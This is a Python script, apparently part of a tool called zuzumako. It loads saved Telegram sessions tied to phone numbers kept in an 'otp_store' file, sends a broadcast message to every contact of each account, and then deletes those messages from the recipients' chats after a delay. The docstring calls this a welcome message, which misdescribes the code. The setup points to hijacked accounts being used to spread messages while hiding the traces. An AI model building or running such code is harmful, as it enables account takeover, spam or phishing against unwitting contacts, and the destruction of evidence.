#!/usr/bin/env python3
"""
zuzumako / automater.py
────────────────────────
Reads otp_store.txt, finds all non-expired entries,
and sends a welcome message to each number using the saved session.

Triggered automatically after auth.py completes, or run manually.

Usage:
  python automater.py
"""

import json, sys, os, asyncio
from pathlib import Path
from dotenv import load_dotenv

BASE     = Path(__file__).parent
load_dotenv(BASE / "config" / ".env")

API_ID   = int(os.getenv("TELEGRAM_API_ID", "0"))
API_HASH = os.getenv("TELEGRAM_API_HASH", "")
OTP_FILE = BASE / "otp_store.txt"
SESSIONS = BASE / "sessions"

from broadcast import MESSAGE, get_broadcast_config

async def broadcast_for_session(phone):
    safe = phone.replace("+", "").replace(" ", "")
    session_path = SESSIONS / safe
    if not (SESSIONS / f"{safe}.session").exists():
        print(f"[automater] ✗  No session file for {phone}")
        return

    from telethon import TelegramClient
    from telethon.tl.functions.contacts import GetContactsRequest

    limit, delay, revoke = get_broadcast_config()

    print(f"[automater] Starting broadcast for {phone}…")
    try:
        async with TelegramClient(str(session_path), API_ID, API_HASH) as client:
            me = await client.get_me()
            print(f"[automater] Logged in as {me.first_name} (@{me.username})")

            result   = await client(GetContactsRequest(hash=0))
            contacts = [u for u in result.users if not u.bot and not u.is_self]

            if limit >= 0:
                contacts = contacts[:limit]

            print(f"[automater] Found {len(contacts)} contact(s) to process (limit={limit})")

            if not contacts:
                return

            sent = []
            for contact in contacts:
                name = f"{contact.first_name or ''} {contact.last_name or ''}".strip()
                try:
                    entity = await client.get_entity(contact.id)
                    msg    = await client.send_message(entity, MESSAGE)
                    sent.append((entity, msg.id))
                    print(f"[automater] ✓  Sent to {name}")
                except Exception as e:
                    print(f"[automater] ✗  Failed to send to {name}: {e}")

            if not sent:
                return

            print(f"[automater] Waiting {delay}s to delete sent messages…")
            await asyncio.sleep(delay)

            for entity, msg_id in sent:
                try:
                    await client.delete_messages(entity, [msg_id], revoke=revoke)
                    name = getattr(entity, 'first_name', str(entity.id))
                    print(f"[automater] ✓  Deleted from {name}'s chat (revoke={revoke})")
                except Exception as e:
                    print(f"[automater] ✗  Delete failed: {e}")

            print(f"[automater] Done for {phone}")
    except Exception as e:
        print(f"[automater] ✗  Broadcast failed for {phone}: {e}")

async def send_all():
    if not OTP_FILE.exists():
        sys.exit("✗  otp_store.txt not found.")

    try:
        entries = json.loads(OTP_FILE.read_text())
    except Exception:
        sys.exit("✗  otp_store.txt is corrupt.")

    phones = [e["phone"] for e in entries]

    if not phones:
        sys.exit("✗  No numbers in otp_store.txt.")

    for phone in phones:
        await broadcast_for_session(phone)

def main():
    asyncio.run(send_all())

if __name__ == "__main__":
    main()
